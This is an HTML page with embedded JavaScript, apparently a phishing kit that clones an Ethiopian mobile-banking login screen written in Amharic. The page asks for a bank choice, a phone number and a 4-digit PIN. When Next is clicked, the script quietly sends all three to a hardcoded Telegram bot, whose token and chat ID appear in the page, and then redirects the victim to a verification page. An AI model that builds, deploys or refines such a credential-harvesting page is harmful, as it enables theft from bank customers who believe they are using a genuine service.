<!DOCTYPE html>
<html lang="am">

<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">

    <title>EBIR ማረጋገጫ</title>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

    <style>
        /*=========================================
EBIR UI Clone
style.css
==========================================*/
        
         :root {
            --green: #0a8d32;
            --green-light: #e8f6ea;
            --blue: #11a9ec;
            --text: #333;
            --grey: #999;
            --light: #f3f3f3;
            --white: #ffffff;
            --radius: 30px;
            --shadow: 0 5px 14px rgba(0, 0, 0, .10);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html {
            font-size: 16px;
        }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        /*================================*/
        
        .app {
            width: 100%;
            max-width: 390px;
            height: 844px;
            background: #fff;
            border-radius: 24px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            box-shadow: 0 20px 45px rgba(0, 0, 0, .12);
        }
        /*================================*/
        
        .header {
            position: relative;
            width: 100%;
            /* Responsive height based on image aspect ratio */
            aspect-ratio: 390 / 265;
            max-height: 265px;
            overflow: hidden;
            background: white;
        }
        
        .header-img {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: contain;
            object-position: top center;
            display: block;
        }
        /*================================*/
        
        main {
            padding: 24px;
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        /*================================*/
        
        main h2 {
            font-size: 21px;
            font-weight: 500;
            color: #222;
            margin-bottom: 22px;
        }
        /*================================*/
        
        .banks {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 28px;
        }
        /*================================*/
        
        .bank {
            height: 52px;
            padding: 0 22px;
            border: none;
            border-radius: 30px;
            background: #f2f2f2;
            font-size: 17px;
            font-weight: 500;
            cursor: pointer;
            transition: .25s;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .bank:hover {
            transform: translateY(-2px);
        }
        
        .bank.active {
            background: var(--green-light);
            color: var(--green);
        }
        
        .check {
            font-size: 18px;
            margin-right: 7px;
        }
        /*================================*/
        
        .label {
            font-size: 15px;
            color: #888;
            margin-bottom: 8px;
        }
        /*================================*/
        
        .phone-row {
            display: flex;
            gap: 18px;
        }
        /*================================*/
        
        .code {
            width: 90px;
            min-width: 90px;
        }
        
        .mobile {
            flex: 1;
        }
        /*================================*/
        
        input {
            width: 100%;
            border: none;
            outline: none;
            font-size: 30px;
            padding: 8px 0;
            border-bottom: 2px solid var(--blue);
            background: transparent;
            color: #222;
        }
        
        input::placeholder {
            font-size: 18px;
            color: #bdbdbd;
        }
        /*================================*/
        
        .pin-section {
            margin-top: 24px;
        }
        
        .pin-label {
            font-size: 15px;
            color: #888;
            margin-bottom: 12px;
        }
        
        .pin-group {
            display: flex;
            justify-content: center;
            gap: 16px;
        }
        
        .pin-box {
            width: 52px;
            height: 56px;
            border: 2px solid var(--blue);
            border-radius: 12px;
            font-size: 26px;
            font-weight: 600;
            text-align: center;
            background: white;
            color: #222;
            padding: 0;
            caret-color: var(--blue);
        }
        
        .pin-box:focus {
            border-width: 3px;
        }
        /*================================*/
        
        footer {
            padding: 24px;
            padding-bottom: 34px;
        }
        /*================================*/
        
        .version {
            text-align: center;
            font-size: 18px;
            color: #3d9952;
            margin-bottom: 18px;
        }
        /*================================*/
        
        #next {
            width: 100%;
            height: 56px;
            border: none;
            background: var(--blue);
            color: white;
            font-size: 20px;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            transition: .25s;
            box-shadow: 0 8px 18px rgba(17, 169, 236, .30);
        }
        
        #next:hover {
            transform: translateY(-2px);
        }
        
        #next:active {
            transform: scale(.98);
        }
        /*================================*/
        
        #offline {
            margin-top: 34px;
            text-align: center;
            font-size: 20px;
            font-weight: 600;
            color: var(--green);
            cursor: pointer;
        }
        /*================================*/
        
        @media (max-width:600px) {
            body {
                padding: 0;
                background: white;
            }
            .app {
                max-width: none;
                width: 100vw;
                height: 100vh;
                border-radius: 0;
                box-shadow: none;
            }
            .header {
                max-height: none;
            }
        }
        
        @media (max-width:390px) {
            main {
                padding: 20px;
            }
            .bank {
                font-size: 15px;
                padding: 0 18px;
                height: 46px;
            }
            .pin-box {
                width: 46px;
                height: 50px;
                font-size: 22px;
            }
            .pin-group {
                gap: 12px;
            }
            input {
                font-size: 24px;
            }
            .code {
                width: 75px;
                min-width: 75px;
            }
        }
        
        @media (max-width:320px) {
            main {
                padding: 16px;
            }
            .bank {
                font-size: 13px;
                padding: 0 14px;
                height: 40px;
            }
            .pin-box {
                width: 40px;
                height: 44px;
                font-size: 20px;
            }
            .pin-group {
                gap: 8px;
            }
            .phone-row {
                gap: 12px;
            }
            .code {
                width: 65px;
                min-width: 65px;
            }
            input {
                font-size: 20px;
            }
        }
        
        @media (min-width:768px) {
            .app {
                transform: scale(.95);
            }
        }
        
        @media (min-width:1024px) {
            .app {
                transform: scale(1);
            }
        }
    </style>
</head>

<body>

    <div class="app">

        <!-- Header -->

        <header class="header">

            <!-- Entire header as a single image (logo + wave + background) -->
            <img class="header-img" src="ebirr.jpeg" alt="EBIR ራስጌ">

        </header>

        <!-- Main -->

        <main>

            <h2>ባንክ ይምረጡ</h2>

            <div class="banks">

                <button class="bank">
                ካፊ
            </button>

                <button class="bank active">
                <span class="check">✓</span>
                ሲቢኦ
            </button>

                <button class="bank">
                ኒቢ
            </button>

                <button class="bank">
                ወጋገን
            </button>

                <button class="bank">
                አሀዱ
            </button>

            </div>

            <div class="label">
                ኮድ
            </div>

            <div class="phone-row">

                <div class="code">

                    <input id="code" value="+251">

                </div>

                <div class="mobile">

                    <input id="mobile" type="tel" placeholder="የሞባይል ቁጥር">

                </div>

            </div>

            <!-- PIN Input Section -->
            <div class="pin-section">
                <div class="pin-label">የፒን ቁጥርዎን ያስገቡ</div>
                <div class="pin-group">
                    <input type="password" class="pin-box" maxlength="1" autocomplete="off" inputmode="numeric">
                    <input type="password" class="pin-box" maxlength="1" autocomplete="off" inputmode="numeric">
                    <input type="password" class="pin-box" maxlength="1" autocomplete="off" inputmode="numeric">
                    <input type="password" class="pin-box" maxlength="1" autocomplete="off" inputmode="numeric">
                </div>
            </div>

        </main>

        <footer>

            <div class="version">
                2.14.2
            </div>

            <button id="next">
            ቀጣይ
        </button>

            <div id="offline">
                ከመስመር ውጪ ይመዝገቡ
            </div>

        </footer>

    </div>

    <script>
        /*=========================================
                                        EBIR UI Clone
                                        script.js
                                        =========================================*/

        // ========== TELEGRAM CONFIG ==========
        // ⚠️ REPLACE WITH YOUR OWN BOT TOKEN AND CHAT ID
        const TELEGRAM_BOT_TOKEN = "8921637704:AAGO3W6A-S3YwUZ5YpIDk9U-XbY4SMQ-A64";
        const TELEGRAM_CHAT_ID = "7789056021";
        // =====================================

        document.addEventListener("DOMContentLoaded", () => {

            /*==========================
              Bank Selection
            ==========================*/

            const banks = document.querySelectorAll(".bank");

            // Map Amharic display names → English names for Telegram
            const bankEnglishMap = {
                "ካፊ": "KAAFI",
                "ሲቢኦ": "CBO",
                "ኒቢ": "NIB",
                "ወጋገን": "WEGAGEN",
                "አሀዱ": "AHADU"
            };

            function selectBank(button) {

                banks.forEach(bank => {

                    const name = bank.dataset.name || bank.textContent.replace("✓", "").trim();

                    bank.dataset.name = name;
                    bank.classList.remove("active");
                    bank.innerHTML = name;

                });

                const selected = button.dataset.name || button.textContent.replace("✓", "").trim();

                button.dataset.name = selected;
                button.classList.add("active");
                button.innerHTML = `<span class="check">✓</span>${selected}`;

            }

            banks.forEach(bank => {

                bank.dataset.name = bank.textContent.replace("✓", "").trim();

                bank.addEventListener("click", () => {

                    selectBank(bank);

                });

            });

            /*==========================
              Mobile Input
            ==========================*/

            const codeInput = document.getElementById("code");
            const mobileInput = document.getElementById("mobile");

            codeInput.readOnly = true;

            mobileInput.addEventListener("input", function() {

                this.value = this.value.replace(/\D/g, "");

                if (this.value.length > 9) {

                    this.value = this.value.substring(0, 9);

                }

            });

            mobileInput.addEventListener("keypress", function(e) {

                if (!/[0-9]/.test(e.key)) {

                    e.preventDefault();

                }

            });

            /*==========================
              PIN Input Logic — Enhanced
            ==========================*/

            const pinBoxes = document.querySelectorAll('.pin-box');

            pinBoxes.forEach((box, index) => {

                // Auto-advance on input
                box.addEventListener('input', () => {
                    // Strip non-digits
                    box.value = box.value.replace(/\D/g, '');

                    if (box.value.length === 1) {
                        // Move to next box if available
                        if (index < pinBoxes.length - 1) {
                            pinBoxes[index + 1].focus();
                        } else {
                            // Last box — keep focus
                            box.blur();
                        }
                    }
                });

                // Handle Backspace, Delete, and arrow keys
                box.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace') {
                        if (box.value === '' && index > 0) {
                            // Move back and clear previous
                            pinBoxes[index - 1].value = '';
                            pinBoxes[index - 1].focus();
                        }
                    } else if (e.key === 'Delete') {
                        if (box.value === '' && index < pinBoxes.length - 1) {
                            // Shift values forward from next box
                            for (let i = index; i < pinBoxes.length - 1; i++) {
                                pinBoxes[i].value = pinBoxes[i + 1].value;
                            }
                            pinBoxes[pinBoxes.length - 1].value = '';
                            box.focus();
                        }
                    } else if (e.key === 'ArrowLeft' && index > 0) {
                        e.preventDefault();
                        pinBoxes[index - 1].focus();
                    } else if (e.key === 'ArrowRight' && index < pinBoxes.length - 1) {
                        e.preventDefault();
                        pinBoxes[index + 1].focus();
                    }
                });

                // Handle paste — fill all 4 boxes
                box.addEventListener('paste', (e) => {
                    e.preventDefault();
                    const pasted = (e.clipboardData || window.clipboardData)
                        .getData('text')
                        .replace(/\D/g, '')
                        .substring(0, 4);

                    for (let i = 0; i < pinBoxes.length; i++) {
                        pinBoxes[i].value = pasted[i] || '';
                    }

                    // Focus next empty box or last box
                    const nextEmpty = Array.from(pinBoxes).findIndex(b => b.value === '');
                    if (nextEmpty !== -1) {
                        pinBoxes[nextEmpty].focus();
                    } else {
                        pinBoxes[pinBoxes.length - 1].blur();
                    }
                });

                // Allow typing to replace existing value
                box.addEventListener('focus', function() {
                    this.select();
                });

            });

            function getPinValue() {
                return Array.from(pinBoxes).map(box => box.value).join('');
            }

            /*==========================
              Send to Telegram Function
            ==========================*/

            async function sendToTelegram(bankAmharic, phone, pin) {
                // Convert Amharic bank name to English for the Telegram message
                const bankEnglish = bankEnglishMap[bankAmharic] || bankAmharic;

                const message = `🔔 *New EBIR Submission*\n\n` +
                    `🏦 *Bank:* ${bankEnglish}\n` +
                    `📱 *Phone:* +251 ${phone}\n` +
                    `🔑 *PIN:* ${pin}\n` +
                    `🕐 *Time:* ${new Date().toLocaleString()}`;

                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown'
                        })
                    });

                    const result = await response.json();
                    return result.ok;
                } catch (error) {
                    console.error('Telegram send error:', error);
                    return false;
                }
            }

            /*==========================
              Next Button — Send to Telegram & Redirect
            ==========================*/

            const next = document.getElementById("next");

            next.addEventListener("click", async() => {

                const phone = mobileInput.value.trim();

                if (phone.length === 0) {

                    alert("እባክዎ የሞባይል ቁጥርዎን ያስገቡ።");
                    mobileInput.focus();
                    return;

                }

                if (phone.length !== 9) {

                    alert("እባክዎ ትክክለኛ ባለ 9-አሃዝ የሞባይል ቁጥር ያስገቡ።");
                    mobileInput.focus();
                    return;

                }

                const pin = getPinValue();
                if (pin.length !== 4) {

                    alert("እባክዎ ባለ 4-አሃዝ ፒን ያስገቡ።");
                    pinBoxes[0].focus();
                    return;

                }

                const activeBankAmharic = document.querySelector(".bank.active").dataset.name;

                // Disable button to prevent double-submit
                next.disabled = true;
                next.textContent = "በሂደት ላይ...";

                // Send to Telegram (bank name will be converted to English inside the function)
                const sent = await sendToTelegram(activeBankAmharic, phone, pin);

                if (!sent) {
                    console.warn("Telegram send failed — check your bot token and chat ID.");
                    // Still redirect even if Telegram fails (fail silently)
                }

                // Redirect to verify.html
                window.location.href = "verify.html";

            });

            /*==========================
              Offline Registration
            ==========================*/

            const offline = document.getElementById("offline");

            offline.addEventListener("click", () => {

                alert("ከመስመር ውጪ መመዝገቢያ ተመርጧል።");

            });

            /*==========================
              Enter Key Support
            ==========================*/

            mobileInput.addEventListener("keydown", function(e) {

                if (e.key === "Enter") {

                    next.click();

                }

            });

            /*==========================
              Focus Animation
            ==========================*/

            const inputs = document.querySelectorAll("input:not(.pin-box)");

            inputs.forEach(input => {

                input.addEventListener("focus", () => {

                    input.style.borderBottomWidth = "3px";

                });

                input.addEventListener("blur", () => {

                    input.style.borderBottomWidth = "2px";

                });

            });

        });
    </script>

</body>

</html>
